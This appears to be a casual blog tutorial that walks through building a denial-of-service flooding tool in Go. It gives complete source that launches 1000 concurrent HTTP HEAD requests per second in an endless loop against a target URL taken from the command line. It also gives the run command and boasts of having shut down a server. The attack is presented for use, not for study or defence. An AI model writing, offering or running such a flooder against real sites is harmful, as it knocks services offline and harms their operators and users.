# Making A DDOS Tool With Go

Hi there today I'm going to make a simple tool for DDOS attack. And it's fully written in Golang. No additional plugin required.

## Our Attack Map:

We are going to make 1000 or more concurrent requests at once. If the server is not enough strong, it will crash within 10-15 seconds after a single attack!

## Let's Code It:

Let's dive into code, but I'm going to break the code into pieces first.

### Making A Request:

The `Request` function will send a request to the server.

```Go
func Request(uri string){
    http.Head(uri)
}
```

The `http.Head(uri)` receives only headers from a url. We don't need the content of the page. So we're not going to process further things.

## Attaaaaaaaaack!

Now we need to put the `Request` function in a loop.

```Go
func main(){
    target := os.Args[1] // the target site
    for {
        fmt.Print(".")
        for i := 0; i < 1000; i++ {
            go Request(target)
        }
        // need some rest
        time.Sleep(time.Second)
    }
}
```

Here we're sending 1000 requests to the server in every second.

And it's that much simple!

## Full Code:

```Go
package main

import (
    "fmt"
    "net/http"
    "os"
    "time"
)

func main() {
    target := os.Args[1] // the target site
    for {
        fmt.Print(".")
        for i := 0; i < 1000; i++ {
            go Request(target)
        }
        // need some rest
        time.Sleep(time.Second)
    }
}

func Request(uri string) {
    http.Head(uri)
}
```

Now save it and run with 

```TXT
$ go run main.go http://example.com
```
Now wait for 30-40 seconds after getting the `...` like output!

Voila!

We've successfully shutted down a server by a single attack :v
